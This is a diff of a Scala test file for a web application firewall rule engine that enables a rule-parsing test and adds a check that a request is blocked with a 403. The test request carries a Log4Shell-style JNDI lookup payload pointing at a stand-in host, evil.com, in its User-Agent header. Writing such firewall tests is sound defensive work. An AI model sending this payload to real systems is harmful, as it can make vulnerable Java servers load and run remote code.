@@ -38,7 +38,7 @@ class SecLangBasicTest extends munit.FunSuite {
     assert(res.isRight, "rules has been parsed")
   }
 
-  test("antlr_crs".ignore) {
+  test("antlr_crs") {
     val client = HttpClient.newHttpClient()
     /*val data: Map[String, String] = List(
       "asp-dotnet-errors.data",
@@ -128,6 +128,18 @@ class SecLangBasicTest extends munit.FunSuite {
         val config2 = Configuration.format.reads(Json.parse(out1)).get
         val out2 = Json.prettyPrint(config2.json)
         assertEquals(out1, out2)
+
+        val program = SecLang.compile(config)
+        val engine = SecLang.engine(program)
+        val failing_ctx = RequestContext(
+          method = "GET",
+          uri = "/",
+          headers = Map("User-Agent" -> List("${jndi:ldap://evil.com/a}")),
+          query = Map("q" -> List("test")),
+          body = None
+        )
+        val failing_res = engine.evaluate(failing_ctx, phases = List(1, 2)).displayPrintln()
+        assertEquals(failing_res.disposition, Block(403, None, None))
       }
     }
   }
